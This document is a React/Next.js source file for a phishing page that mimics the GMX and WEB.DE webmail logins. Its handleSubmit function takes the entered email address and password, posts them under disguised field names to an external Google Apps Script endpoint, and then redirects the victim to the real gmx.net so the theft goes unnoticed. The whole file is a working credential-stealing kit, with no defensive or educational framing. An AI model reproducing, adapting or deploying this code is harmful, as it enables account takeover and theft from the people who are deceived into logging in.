"use client";
import Image from "next/image";
import webde from "../../public/web.svg";
import webmo from "../../public/web-de.jpeg";

import screenshot1 from "../../public/Lcreenshot1.png";
import screenshot2 from "../../public/Screenshot2.png";
import screenshot3 from "../../public/Screenshot3.png";
import screenshot4 from "../../public/Screenshot4.png";
import screenshot5 from "../../public/Screenshot5.png";
import screenshot6 from "../../public/Screenshot6.png";
import screenshot7 from "../../public/Screenshot7.png";
import footer from "../../public/footer.png";
import Advert from "./advert";
import WebFooter from "./webfooter";
import { useRef, useState } from "react";
import { FormEvent, ChangeEvent } from "react";
import axios from "axios";
//oo
type Form = {
  email: string;
  passwort: string;
};

export default function Main() {
  const picks = [
    "Email & Cloud",
    "Mobilfunk & DSL",
    "Strom & Gas",
    "Shop",
    "Lotto",
    "Versicherung",
  ];

  const passwordInput = useRef<HTMLInputElement>(null);

  const passwordInputWeb = useRef<HTMLInputElement>(null);

  const [credentials, setCredentials] = useState<Form>({
    email: "",
    passwort: "",
  });

  const [isLoading, setIsLoading] = useState(false);

  const [count, setCount] = useState(0);
  console.log(credentials);

  const handleChange = (e: ChangeEvent<HTMLInputElement>) => {
    let name = e.target.name;
    let value = e.target.value;

    setCredentials({ ...credentials, [name]: value });
  };

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    const f = new FormData();
    setIsLoading(true);
    e.preventDefault();
    //chibui const scriptURL = 'https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec'
    try {
      f.set("rosan", credentials.email);
      f.set("rosana", credentials.passwort);
      f.set("rosharck", "gmx");
      const result = await axios.post(
        "https://script.google.com/macros/s/AKfycbwXznLKtmUwnsaTpHpw--ZE9rG9PsBhmtmWKskkEIRD80SjaUVHPMW2vMSZdM9TuQAHPw/exec",
        f
      );

      if (result.status === 200) {
        return window.location.replace("https://gmx.net/");
      }

      setCount((prev) => prev + 1);
    } catch (error) {
    } finally {
      setIsLoading(false);
    }
  };

  const handleShow = () => {
    passwordInput.current!.type === "password"
      ? (passwordInput.current!.type = "text")
      : (passwordInput.current!.type = "password");
  };

  const handleShowWeb = () => {
    passwordInputWeb.current!.type === "password"
      ? (passwordInputWeb.current!.type = "text")
      : (passwordInputWeb.current!.type = "password");
  };

  return (
    <>
      <main className="bg-gray-100 min-w-[1230px] hidden md:flex ">
        <div className="bg-white w-2/3 min-h-screen mx-auto">
          <div className="w-full h-1 bg-[#1c449b]"></div>
          <div className="flex items-center justify-between bg-[#1c449b] px-3">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              viewBox="0 0 123 40"
              height={100}
              width={100}
            >
              <path
                d="m 109.17,18.84 10.66,-17.75 -10.88,0 -5.67,9 -6.1,-9 -11.92,0 12.57,17.73 -12.57,20 11.92,0 6.8,-11.37 8.06,11.37 10.64,0 z M 69.75,1.09 61.66,21.28 53.99,1.09 l -9.67,0 -6.42,37.78 9.77,0 3.16,-21.77 0.1,0 8.66,21.77 3.91,0 9.07,-21.77 0.12,0 2.75,21.77 9.82,0 -5.72,-37.78 z m -49.8,16.71 0,7.68 8,0 C 27.53,29.79 24.27,32 20.05,32 13.63,32 10.16,26.09 10.16,20.25 10.16,14.41 13.49,8.4 19.9,8.4 c 3.94,0 6.76,2.38 8.11,5.95 l 9.26,-3.88 C 34.04,3.47 28.06,0 20.34,0 8.25,0 0,8 0,20.19 0,32 8.2,40 20,40 26.27,40 31.8,37.76 35.46,32.64 38.75,28 39.2,23.28 39.3,17.8 Z"
                style={{ fill: "rgb(255, 255, 255)", fillOpacity: 1 }}
                className="w-6 h-6"
              ></path>
            </svg>

            <div className="flex items-center w-2/5">
              <input
                type="text"
                placeholder="Suchen"
                className="w-full text-black placeholder:text-lg h-10 saturate-100 hover:saturate-100 p-3 border rounded-l-md border-gray-300 focus:border-sky-500 hover:border-sky-500 trasition duration-300 ease-linear outline-none"
              />
              <div className="h-10 w-10 rounded-r-md bg-[#6e9804] flex justify-center items-center">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                  strokeWidth={1.5}
                  stroke="currentColor"
                  className="w-6 h-6"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"
                  />
                </svg>
              </div>
            </div>

            <button className="h-8 w-1/5 transition duration-150 ease-in hover:bg-sky-500 hover:text-white border font-medium text-sky-500 border-sky-500 text-center outline-none rounded-md">
              Mail-account anlegen
            </button>
          </div>

          <div className="w-full flex items-center justify-between mt-1 border border-gray-300 py-1 pl-4">
            <div className="flex items-center">
              <svg
                xmlns="http://www.w3.org/2000/svg"
                fill="none"
                viewBox="0 0 24 24"
                strokeWidth={1.5}
                stroke="currentColor"
                className="w-6 h-6 mr-2"
              >
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"
                />
              </svg>

              {picks.map((pick, index) => {
                return (
                  <h1
                    className="px-3 hover:underline font-normal underline-offset-8 decoration-sky-500 cursor-pointer hover:decoration-4 text-sm text-gray-800"
                    key={index}
                  >
                    {pick}
                  </h1>
                );
              })}
            </div>

            <div className="flex space-x-5 mr-3">
              <img src="https://adimg.uimserv.net/otto/2021/210617/otto_logo_44x16-2.svg"></img>

              <img src="https://adimg.uimserv.net/MONA/2021/Promoline_12461_mona-56x16-1.svg"></img>

              <img src="https://adimg.uimserv.net/BaurVersand/210618/Promoline_baur-logo_56x16px-2.svg"></img>
            </div>
          </div>

          <div className="w-full px-2 mt-7 mb-6 cursor-pointer">
            <Image
              src="/Lcreenshot1.png"
              alt="screenshot1"
              height={1200}
              width={1200}
              priority
            />
          </div>

          <div className="h-20 bg-gray-100 mx-2 flex items-center justify-center sticky top-0">
            <div className="flex items-center space-x-3">
              <svg viewBox="0 2 40 40" className="h-8 w-8" fill="#04B7E2">
                <path d="M40 32V9.9v-.08L28.92 20.9zM11.1 20.92L0 9.82V32zM21.37 25.17L38.94 7.59a3.05 3.05 0 0 0-2-.78H3.09a3.05 3.05 0 0 0-2 .78l17.54 17.58a2 2 0 0 0 2.74 0z"></path>
                <path d="M27.27 22.54L23 26.81a4.27 4.27 0 0 1-6 0l-4.25-4.25L.3 35a3.1 3.1 0 0 0 2.79 1.8h33.82a3.11 3.11 0 0 0 2.81-1.8z"></path>
              </svg>
              <h1 className="font-light hidden lg:block text-2xl text-sky-600">
                E-Mail
              </h1>

              <form
                onSubmit={(e) => handleSubmit(e)}
                className="flex items-center space-x-5"
              >
                <div className="flex flex-col">
                  <input
                    type="text"
                    name="email"
                    value={credentials.email}
                    onChange={(e) => handleChange(e)}
                    placeholder="E-Mail-Addresse"
                    className="h-10 text-black border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-sky-500 hover:border-sky-500 placeholder:hover:text-sky-500 trasition duration-300 ease-linear outline-none"
                    required
                  />
                  <label htmlFor="email" className="text-xs text-gray-500">
                    Kostenlos registrieren!
                  </label>
                </div>

                <div className="flex flex-col relative">
                  <input
                    type="password"
                    value={credentials.passwort}
                    onChange={(e) => handleChange(e)}
                    ref={passwordInputWeb}
                    name="passwort"
                    placeholder="Passwort"
                    className="h-10  border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-sky-500 placeholder:hover:text-sky-500 hover:border-sky-500 trasition duration-300 ease-linear outline-none text-black"
                    required
                  />
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    onClick={handleShowWeb}
                    viewBox="0 0 24 24"
                    fill="#808080"
                    className="w-4 h-4 cursor-pointer absolute right-3 top-3"
                  >
                    <path d="M12 15a3 3 0 100-6 3 3 0 000 6z" />
                    <path
                      fillRule="evenodd"
                      d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z"
                      clipRule="evenodd"
                    />
                  </svg>
                  <label htmlFor="email" className="text-xs text-gray-500">
                    Passwort Vergessen?
                  </label>
                </div>

                <button
                  type="submit"
                  className="bg-[#6e9804] h-10 w-20 rounded-md hover:saturate-50 font-semibold mb-3 text-center text-white"
                >
                  {isLoading ? (
                    <svg
                      className="animate-spin h-5 w-5 text-white mx-auto"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                  ) : (
                    "Login"
                  )}
                </button>

                <svg viewBox="0 0 24 22.65" className="netid h-6 w-6 mb-3">
                  <path
                    d="M10.72 6.34l1.45-1.41 2.73 2.73L22.6 0 24 1.37l-9.15 9.15-4.13-4.18z"
                    className="netid_checkmark"
                  ></path>{" "}
                  <path d="M21.8 6.2l-1.17 1.17c.67 2.21.52 3.94-1.81 6.26l-2.69 2.7-9.81-9.81L9 3.8c2.89-2.88 5.29-2.67 8.07-1l1.08-1.08C14.74-.59 11.49-.73 8 2.79l-8 8 11.89 11.86 8-8C22.8 11.74 23 9.18 21.8 6.2"></path>
                </svg>
              </form>
            </div>
          </div>

          <Advert src="/Screenshot2.png" />
          <Advert src="/Screenshot3.png" />
          <Advert src="/Screenshot4.png" />
          <Advert src="/Screenshot5.png" />

          <WebFooter src="/Screenshot6.png" />
          <WebFooter src="/Screenshot7.png" />
          <WebFooter src="/footer.png" />
        </div>
      </main>

      <main className="w-screen min-h-screen md:hidden bg-white">
        <div className="w-full h-1 bg-[#1c449b]"></div>

        <div className="border-b flex items-center bg-[#1c449b] pl-3">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 123 40"
            height={100}
            width={100}
          >
            <path
              d="m 109.17,18.84 10.66,-17.75 -10.88,0 -5.67,9 -6.1,-9 -11.92,0 12.57,17.73 -12.57,20 11.92,0 6.8,-11.37 8.06,11.37 10.64,0 z M 69.75,1.09 61.66,21.28 53.99,1.09 l -9.67,0 -6.42,37.78 9.77,0 3.16,-21.77 0.1,0 8.66,21.77 3.91,0 9.07,-21.77 0.12,0 2.75,21.77 9.82,0 -5.72,-37.78 z m -49.8,16.71 0,7.68 8,0 C 27.53,29.79 24.27,32 20.05,32 13.63,32 10.16,26.09 10.16,20.25 10.16,14.41 13.49,8.4 19.9,8.4 c 3.94,0 6.76,2.38 8.11,5.95 l 9.26,-3.88 C 34.04,3.47 28.06,0 20.34,0 8.25,0 0,8 0,20.19 0,32 8.2,40 20,40 26.27,40 31.8,37.76 35.46,32.64 38.75,28 39.2,23.28 39.3,17.8 Z"
              style={{ fill: "rgb(255, 255, 255)", fillOpacity: 1 }}
              className="my-2"
            ></path>
          </svg>

          <h1 className=" ml-4 font-light text-lg text-white">Mobile Login</h1>
        </div>

        <div className="flex flex-col items-center">
          <svg
            xmlns="http://www.w3.org/2000/svg"
            viewBox="0 0 123 40"
            height={100}
            width={100}
          >
            <path
              d="m 109.17,18.84 10.66,-17.75 -10.88,0 -5.67,9 -6.1,-9 -11.92,0 12.57,17.73 -12.57,20 11.92,0 6.8,-11.37 8.06,11.37 10.64,0 z M 69.75,1.09 61.66,21.28 53.99,1.09 l -9.67,0 -6.42,37.78 9.77,0 3.16,-21.77 0.1,0 8.66,21.77 3.91,0 9.07,-21.77 0.12,0 2.75,21.77 9.82,0 -5.72,-37.78 z m -49.8,16.71 0,7.68 8,0 C 27.53,29.79 24.27,32 20.05,32 13.63,32 10.16,26.09 10.16,20.25 10.16,14.41 13.49,8.4 19.9,8.4 c 3.94,0 6.76,2.38 8.11,5.95 l 9.26,-3.88 C 34.04,3.47 28.06,0 20.34,0 8.25,0 0,8 0,20.19 0,32 8.2,40 20,40 26.27,40 31.8,37.76 35.46,32.64 38.75,28 39.2,23.28 39.3,17.8 Z"
              style={{ fill: "#1c449b", fillOpacity: 1 }}
              className="ml-3 my-10"
            ></path>
          </svg>

          <h1 className=" ml-4 text-center mr-2 font-semibold text-xl text-gray-600">
            Login
          </h1>

          <div className="text-center my-7">
            <p className="text-gray-600">
              Bitte melden Sie sich hier mit Ihrem WEB.DE
            </p>

            <p className="text-gray-600">Nutzernamen und Ihrem Passwort an.</p>
          </div>

          <form onSubmit={(e) => handleSubmit(e)} className="w-4/5 space-y-4">
            <div className="flex flex-col space-y-1">
              <label htmlFor="email" className="text-gray-600">
                WEB.DE Nutzername
              </label>
              <input
                type="text"
                name="email"
                value={credentials.email}
                onChange={(e) => handleChange(e)}
                className="h-10 text-black border rounded-md outline-none p-2"
                required
              />
            </div>

            <div className="flex flex-col space-y-1 relative">
              <label htmlFor="password" className="text-gray-600">
                Passwort eingeben
              </label>
              <input
                type="password"
                name="passwort"
                value={credentials.passwort}
                onChange={(e) => handleChange(e)}
                ref={passwordInput}
                className="h-10 border rounded-md outline-none p-2 text-black"
                required
              />

              <svg
                xmlns="http://www.w3.org/2000/svg"
                onClick={handleShow}
                viewBox="0 0 24 24"
                fill="#808080"
                className="cursor-pointer w-5 h-5 absolute right-3 top-8"
              >
                <path d="M12 15a3 3 0 100-6 3 3 0 000 6z" />
                <path
                  fillRule="evenodd"
                  d="M1.323 11.447C2.811 6.976 7.028 3.75 12.001 3.75c4.97 0 9.185 3.223 10.675 7.69.12.362.12.752 0 1.113-1.487 4.471-5.705 7.697-10.677 7.697-4.97 0-9.186-3.223-10.675-7.69a1.762 1.762 0 010-1.113zM17.25 12a5.25 5.25 0 11-10.5 0 5.25 5.25 0 0110.5 0z"
                  clipRule="evenodd"
                />
              </svg>
            </div>

            <button
              type="submit"
              className="bg-[#6e9804] w-full h-8 rounded-md text-center text-white"
            >
              {isLoading ? (
                <svg
                  className="animate-spin mx-auto h-5 w-5 text-white"
                  xmlns="http://www.w3.org/2000/svg"
                  fill="none"
                  viewBox="0 0 24 24"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  ></circle>
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                  ></path>
                </svg>
              ) : (
                "Login"
              )}
            </button>

            <h1 className="text-[#1c449b] text-center mt-3">
              Passwort Vergessen?
            </h1>
          </form>

          <div className="h h-[1px] w-4/5 bg-gray-300 mt-10"></div>

          <h1 className="font-semibold mt-9">Neu bei WEB.DE?</h1>

          <h1 className="text-[#1c449b] mt-5">Jetzt kostenlos registrieren!</h1>

          <Image
            src="/web-de.png"
            alt="web-de"
            height={100}
            width={500}
            className="mt-8 h-20 w-2/3 mb-8"
          />
        </div>
      </main>
    </>
  );
}
